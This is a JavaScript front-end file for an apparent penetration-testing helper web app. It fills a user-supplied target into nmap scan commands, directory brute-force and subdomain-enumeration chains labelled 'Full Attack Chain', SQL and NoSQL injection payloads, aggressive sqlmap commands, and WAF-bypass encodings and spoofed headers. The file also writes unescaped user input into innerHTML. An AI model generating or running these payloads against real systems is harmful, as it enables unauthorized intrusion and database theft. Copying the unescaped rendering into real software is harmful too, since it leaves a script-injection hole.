let deleteId = null;

// Open Add Modal
function openModal() {
    document.getElementById("modal").style.display = "block";
}

// Close Add Modal
function closeModal() {
    document.getElementById("modal").style.display = "none";
}

// Open Delete Modal
function confirmDelete(id) {
    deleteId = id;
    document.getElementById("deleteModal").style.display = "block";
}

// Close Delete Modal
function closeDeleteModal() {
    document.getElementById("deleteModal").style.display = "none";
}

// Delete Page
function deletePage() {
    window.location.href = "/delete/" + deleteId;
}

/* Optional: Close modal when clicking outside */
window.onclick = function(event) {
    const modal = document.getElementById("modal");
    const deleteModal = document.getElementById("deleteModal");

    if (event.target === modal) {
        modal.style.display = "none";
    }

    if (event.target === deleteModal) {
        deleteModal.style.display = "none";
    }
};

// Open Edit Modal
function openEditModal(id, name, url) {
    document.getElementById("editId").value = id;
    document.getElementById("editName").value = name;
    document.getElementById("editUrl").value = url;

    document.getElementById("editModal").style.display = "block";
}

// Close Edit Modal
function closeEditModal() {
    document.getElementById("editModal").style.display = "none";
}

function generateCommands() {
    let ip = document.getElementById("ip").value.trim();

    if (!ip) {
        alert("Enter IP or Domain");
        return;
    }

    let recon = `nmap -sn ${ip}`;
    let standard = `nmap -sS -sV -T3 ${ip}`;
    let deep = `nmap -sS -sV -O -A -T4 -p- ${ip}`;

    document.getElementById("result").innerHTML = `
        <div style="margin-top:15px;">

            <p><b>Recon Scan (Host Discovery)</b></p>
            <code>${recon}</code><br><br>

            <p><b>Standard Scan (Services + Version)</b></p>
            <code>${standard}</code><br><br>

            <p><b>Deep Scan (Full Assessment)</b></p>
            <code>${deep}</code>

        </div>
    `;
}

function checkHeaders() {
    let url = document.getElementById("url").value;

    if (!url) {
        document.getElementById("result").innerHTML = "❌ Enter URL";
        return;
    }

    fetch("/headers-check", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ url: url })
    })
    .then(res => res.json())
    .then(data => {

        let output = "";

        if (data.error) {
            output = `<p style="color:red;">❌ ${data.error}</p>`;
        } else {

            for (let key in data) {
                if (data[key]) {
                    output += `
                        <div style="margin-bottom:10px;">
                            <b>${key}</b><br>
                            <span style="color:#22c55e;">✅ Present</span>
                            <br><small>${data[key]}</small>
                        </div>
                    `;
                } else {
                    output += `
                        <div style="margin-bottom:10px;">
                            <b>${key}</b><br>
                            <span style="color:#ef4444;">❌ Missing</span>
                        </div>
                    `;
                }
            }
        }

        document.getElementById("result").innerHTML = output;
    });
}

function detectTech() {
    let url = document.getElementById("url").value;

    if (!url) {
        document.getElementById("result").innerHTML = "❌ Enter URL";
        return;
    }

    fetch("/tech-check", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ url: url })
    })
    .then(res => res.json())
    .then(data => {

        let output = "";

        if (data.error) {
            output = `<p style="color:red;">❌ ${data.error}</p>`;
        } else {

            for (let key in data) {
                if (data[key]) {
                    output += `
                        <div>
                            <b>${key}</b>: 
                            <span style="color:#22c55e;">${data[key]}</span>
                        </div>
                    `;
                } else {
                    output += `
                        <div>
                            <b>${key}</b>: 
                            <span style="color:#ef4444;">Not Detected</span>
                        </div>
                    `;
                }
            }
        }

        document.getElementById("result").innerHTML = output;
    });
}

function generateDirCommands() {
    let target = document.getElementById("target").value;

    if (!target) {
        document.getElementById("result").innerHTML = "❌ Enter target URL";
        return;
    }

    let output = `

    <div><b> FFUF (Advanced - Recursive)</b><br>
    <code>ffuf -u ${target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403 -recursion -recursion-depth 2 -t 100</code>
    </div><br>

    <div><b> Feroxbuster (Deep Scan)</b><br>
    <code>feroxbuster -u ${target} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js,json,zip,bak -t 100 -d 3</code>
    </div><br>

    <div><b> Dirsearch (Aggressive)</b><br>
    <code>python3 dirsearch.py -u ${target} -e php,html,js,json,zip,bak -t 100 --deep-recursive --force-recursive</code>
    </div><br>

    <div><b> Gobuster (Fast Scan)</b><br>
    <code>gobuster dir -u ${target} -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,js,json -t 100 -k</code>
    </div><br>

    <div><b> Katana (Modern Crawler)</b><br>
    <code>katana -u ${target} -d 3 -jc -kf -aff</code>
    </div><br>

    <div><b> URL Collection (Hidden Endpoints)</b><br>
    <code>gau ${target} | tee urls.txt</code><br>
    <code>waybackurls ${target}</code>
    </div><br>

    <div><b> Full Attack Chain (Pro)</b><br>
    <code>
    gau ${target} | tee urls.txt && 
    katana -u ${target} -d 3 | tee crawl.txt && 
    ffuf -u ${target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt && 
    feroxbuster -u ${target} -d 3
    </code>
    </div><br>

    `;

    document.getElementById("result").innerHTML = output;
}

function generateSubCommands() {
    let domain = document.getElementById("domain").value;

    if (!domain) {
        document.getElementById("result").innerHTML = " Enter domain";
        return;
    }

    let output = `

    <div><b> Subfinder (Fast)</b><br>
    <code>subfinder -d ${domain} -all -recursive</code>
    </div><br>

    <div><b> Assetfinder</b><br>
    <code>assetfinder --subs-only ${domain}</code>
    </div><br>

    <div><b> Amass (Deep Scan )</b><br>
    <code>amass enum -passive -d ${domain}</code><br>
    <code>amass enum -active -d ${domain} -brute -min-for-recursive 2</code>
    </div><br>

    <div><b>Find Alive Domains (httpx)</b><br>
    <code>subfinder -d ${domain} | httpx -status-code -title -tech-detect</code>
    </div><br>

    <div><b>Full Deep Recon Chain </b><br>
    <code>
    subfinder -d ${domain} -all -recursive | tee subs.txt && 
    assetfinder --subs-only ${domain} >> subs.txt && 
    sort -u subs.txt -o subs.txt && 
    httpx -l subs.txt -status-code -title -tech-detect -o live.txt && 
    amass enum -active -d ${domain} -brute -o amass.txt
    </code>
    </div><br>

    `;

    document.getElementById("result").innerHTML = output;
}

function generateInjection() {
    let url = document.getElementById("url").value;

    if (!url) {
        document.getElementById("result").innerHTML = " Enter URL";
        return;
    }

    let output = `

    <div><b> SQL Injection (Error Based)</b><br>
    <code>${url}'</code><br>
    <code>${url}' OR '1'='1</code><br>
    <code>${url}'--</code><br>
    <code>${url}' AND updatexml(1,concat(0x7e,version(),0x7e),1)--</code>
    </div><br>

    <div><b> SQL Injection (Boolean Based)</b><br>
    <code>${url}' AND 1=1--</code><br>
    <code>${url}' AND 1=2--</code><br>
    <code>${url}' AND SUBSTRING(@@version,1,1)=5--</code>
    </div><br>

    <div><b> SQL Injection (Time Based)</b><br>
    <code>${url}' OR SLEEP(5)--</code><br>
    <code>${url}' AND SLEEP(5)--</code><br>
    <code>${url}' AND IF(1=1,SLEEP(5),0)--</code>
    </div><br>

    <div><b> UNION Based SQLi</b><br>
    <code>${url}' UNION SELECT NULL--</code><br>
    <code>${url}' UNION SELECT 1,2,3--</code><br>
    <code>${url}' UNION SELECT user(),database(),version()--</code>
    </div><br>

    <div><b> WAF Bypass Payloads</b><br>
    <code>${url}' /*!OR*/ 1=1--</code><br>
    <code>${url}' OR 1=1#</code><br>
    <code>${url}' oR 1=1--</code>
    </div><br>

    <div><b> SQLMap Commands</b><br>
    <code>sqlmap -u "${url}" --batch --level=5 --risk=3</code><br>
    <code>sqlmap -u "${url}" --dbs</code><br>
    <code>sqlmap -u "${url}" --random-agent --threads=10</code>
    </div><br>

    <div><b> NoSQL Injection (MongoDB)</b><br>
    <code>{"$gt": ""}</code><br>
    <code>{"$ne": null}</code><br>
    <code>{"username": {"$regex": ".*"}}</code>
    </div><br>

    <div><b> NoSQL URL Payloads</b><br>
    <code>${url}?username[$ne]=1&password[$ne]=1</code><br>
    <code>${url}?username[$gt]=&password[$gt]=</code>
    </div><br>

    <div><b> NoSQL curl Test</b><br>
    <code>curl -X POST ${url} -H "Content-Type: application/json" -d '{"username":{"$ne":null},"password":{"$ne":null}}'</code>
    </div><br>

    `;

    document.getElementById("result").innerHTML = output;
}

function generateWafBypass() {
    let url = document.getElementById("url").value;

    if (!url) {
        document.getElementById("result").innerHTML = "❌ Enter URL";
        return;
    }

    let output = `
    <div><b> Basic WAF Bypass Payloads</b><br>
    <code>${url}?id=1%20OR%201=1</code><br>
    <code>${url}?id=1%27%20OR%20%271%27=%271</code><br>
    <code>${url}?id=1/**/OR/**/1=1</code>
    </div><br>

    <div><b> Encoding Bypass</b><br>
    <code>${url}?id=%27%20OR%201=1--</code><br>
    <code>${url}?id=%2527%2520OR%25201=1</code>
    </div><br>

    <div><b> Case Manipulation</b><br>
    <code>${url}?id=oR 1=1</code><br>
    <code>${url}?id=Or 1=1</code>
    </div><br>

    <div><b> Comment Bypass</b><br>
    <code>${url}?id=1/*comment*/OR/*x*/1=1</code>
    </div><br>

    <div><b> Header Tricks</b><br>
    <code>X-Originating-IP: 127.0.0.1</code><br>
    <code>X-Forwarded-For: 127.0.0.1</code><br>
    <code>X-Real-IP: 127.0.0.1</code>
    </div><br>

    <div><b> SQLMap Bypass Mode</b><br>
    <code>sqlmap -u "${url}" --tamper=space2comment,randomcase,between --random-agent</code>
    </div>
    `;

    document.getElementById("result").innerHTML = output;
}

function clearInjection() {
    document.getElementById("url").value = "";
    document.getElementById("result").innerHTML = "";
}

function clearSub() {
    document.getElementById("domain").value = "";
    document.getElementById("result").innerHTML = "";
}

function clearDir() {
    document.getElementById("target").value = "";
    document.getElementById("result").innerHTML = "";
}

function clearTech() {
    document.getElementById("url").value = "";
    document.getElementById("result").innerHTML = "";
}

function clearHeaders() {
    document.getElementById("url").value = "";
    document.getElementById("result").innerHTML = "";
}

function clearFields() {
    document.getElementById("ip").value = "";
    document.getElementById("result").innerHTML = "";
}